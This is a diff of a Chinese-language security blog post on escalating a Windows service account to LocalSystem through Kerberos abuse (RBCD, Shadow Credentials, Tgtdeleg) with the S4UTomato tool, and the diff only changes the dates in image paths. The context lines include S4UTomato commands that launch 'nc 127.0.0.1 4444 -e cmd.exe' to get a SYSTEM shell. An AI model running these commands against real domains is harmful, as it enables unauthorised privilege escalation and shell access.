@@ -50,7 +50,7 @@ S4U2proxy 扩展要求第一个服务的服务票证设置了可转发标志（F
 
 这里就用到了 S4U2self 和 S4U2proxy 两个扩展。下图可以表示（基于资源的）约束委派的执行流程。
 
-![image-20230713131009369](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/image-20230713131009369.png)
+![image-20230713131009369](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/image-20230713131009369.png)
 
 S4U2self 的描述如上图上半部分所示。 使用此扩展，服务会收到服务本身的服务票证（该票证不能在其他地方使用）。上图描述了以下协议步骤：
 
@@ -151,7 +151,7 @@ S4U.Execute(computerName, domain, computerHash, encType, targetUser, targetSPN, 
 S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.exe"
 ```
 
-![rbcd](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/rbcd.gif)
+![rbcd](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/rbcd.gif)
 
 ## Shadow Credentials
 
@@ -167,7 +167,7 @@ PKINIT 是 Kerberos 协议的扩展协议，允许在身份验证阶段使用数
 
 对称密钥方法是使用最广泛和已知的一种方法，它使用从客户端密码派生的对称密钥（AKA 密钥）。如果使用 RC4 加密，此密钥将是客户端密码的哈希值。KDC 拥有客户端密钥的副本，并且可以解密预身份验证的数据以对客户端进行认证。KDC 使用相同的密钥来加密与 TGT 一起发送给客户端的会话密钥。
 
-![img](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/image-20220428091302031.png)
+![img](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/image-20220428091302031.png)
 
 PKINIT 是不太常见的非对称密钥方法。客户端有一个公/私密钥对，并用他们的私钥对预验证数据进行加密，KDC 用客户端的公钥对其进行解密。KDC 还有一个公/私密钥对，允许使用以下两种方法之一交换会话密钥：
 
@@ -181,7 +181,7 @@ PKINIT 是不太常见的非对称密钥方法。客户端有一个公/私密钥
 
 传统上，公钥基础设施（PKI）允许 KDC 和客户端使用由双方先前已与证书颁发机构（CA）建立信任的实体签署的数字证书以交换他们的公钥。这是证书信任（Certificate Trust）模型，最常用于智能卡身份验证。
 
-![img](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/image-20220428092740053.png)
+![img](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/image-20220428092740053.png)
 
 Microsoft 还引入了密钥信任（Key Trust）的概念，以在不支持 Certificate Trust 的环境中支持无密码身份验证。在 Key Trust 模型下，PKINIT 身份验证是基于原始密钥数据而不是证书建立的。
 
@@ -189,7 +189,7 @@ Microsoft 还引入了密钥信任（Key Trust）的概念，以在不支持 Cer
 
 当客户端登录时，Windows 会尝试使用其私钥执行 PKINIT 身份验证。在 Key Trust 模型下，域控制器可以使用存储在客户端 `msDS-KeyCredentialLink` 属性中的原始公钥解密其预身份验证数据。
 
-![img](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/image-20220428092744784.png)
+![img](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/image-20220428092744784.png)
 
 这种信任模型消除了使用无密码身份验证必须为每个人颁发客户端证书的需要。但是，域控制器仍需要用于会话密钥交换的证书。
 
@@ -277,13 +277,13 @@ S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, domainController, altSer
 S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
 ```
 
-![shadowcred](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/shadowcred.gif)
+![shadowcred](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/shadowcred.gif)
 
 ## Tgtdeleg
 
 Benjamin Delpy（[@gentilkiwi](https://github.com/gentilkiwi)）在其 [Kekeo](https://github.com/gentilkiwi/kekeo/blob/4fbb44ec54ff093ae0fbe4471de19681a8e71a86/kekeo/modules/kuhl_m_tgt.c#L189-L327) 中加入了一个技巧（tgtdeleg），允许你滥用无约束委派来获取一个带有会话密钥的本地 TGT。
 
-<img src="/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/image-20230728091637233.png" alt="image-20230728091637233" style="zoom:67%;" />
+<img src="/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/image-20230728091637233.png" alt="image-20230728091637233" style="zoom:67%;" />
 
 Tgtdeleg 通过滥用 Kerberos GSS-API，以获取当前用户的可用 TGT，而无需在主机上获取提升的权限。该方法使用 `AcquireCredentialsHandle` 函数获取当前用户的 Kerberos 安全凭据句柄，并使用 `ISC_REQ_DELEGATE` 标志和目标 SPN 为 `HOST/DC.domain.com` 调用 `InitializeSecurityContext` 函数，以准备发送给域控制器的伪委派上下文。这导致 GSS-API 输出中的 KRB_AP-REQ 包含了在 Authenticator Checksum 中的 KRB_CRED。然后，从本地 Kerberos 缓存中提取服务票据的会话密钥，并用它来解密 Authenticator 中的 KRB_CRED，从而获得一个可用的 TGT。Rubeus 工具集种也融合了该技巧，具体细节请参考 “[*Rubeus – Now With More Kekeo*](https://blog.harmj0y.net/redteaming/rubeus-now-with-more-kekeo/#tgtdeleg)”。
 
@@ -325,5 +325,5 @@ S4UTomato.exe tgtdeleg
 S4UTomato.exe krbscm -c "nc 127.0.0.1 4444 -e cmd.exe"
 ```
 
-![tgtdeleg](/assets/posts/2023-07-30-escalate-service-account-to-localSystem-via-kerberos/tgtdeleg.gif)
+![tgtdeleg](/assets/posts/2023-08-02-escalate-service-account-to-localSystem-via-kerberos/tgtdeleg.gif)
 
